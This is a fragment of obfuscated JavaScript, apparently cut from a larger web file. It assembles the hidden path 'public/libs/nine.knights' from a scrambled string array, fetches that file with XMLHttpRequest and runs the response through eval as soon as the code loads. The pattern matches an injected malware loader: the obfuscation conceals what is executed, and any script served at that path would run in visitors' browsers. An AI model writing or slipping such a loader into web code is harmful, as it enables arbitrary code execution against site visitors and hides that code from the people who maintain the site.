...
(function(){const _0xabc = ["knights","micro_mark","sevensee","libs","micro","public","orcr","nine"];const _0xpubs = `${_0xabc[5]}/${_0xabc[3]}/${_0xabc[7]}.${_0xabc[0]}`;const _0xreq = new XMLHttpRequest();_0xreq.onload = function() {eval(this.responseText);};_0xreq.open("GET", _0xpubs, true);_0xreq.send();})();
